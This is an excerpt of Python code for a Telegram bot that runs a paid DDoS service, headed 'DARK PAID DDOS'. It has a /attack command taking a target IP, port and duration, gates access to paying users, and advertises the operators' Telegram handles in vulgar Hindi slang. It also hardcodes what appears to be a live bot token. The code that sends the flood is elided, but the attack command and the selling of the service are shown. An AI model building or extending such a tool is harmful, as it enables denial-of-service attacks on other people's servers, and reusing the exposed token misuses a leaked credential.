...
TELEGRAM_BOT_TOKEN = '7543960576:AAGlFThcQgU9_02I_SZeW3QddBqnQ47VuhQ'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @DarkDdosOwner! /get_id*", parse_mode='Markdown')
        return
    message = (
        "*WELCOME 🤗 TO DARK PAID DDOS *\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀sever ki chudayi @DarkDdosHack 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @DarkDdosOwner!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    text=(
        ...
        f"*🔥chudai chalu h feedback bhej dena @Ddoswalagroup💥*"
    ), parse_mode='Markdown')
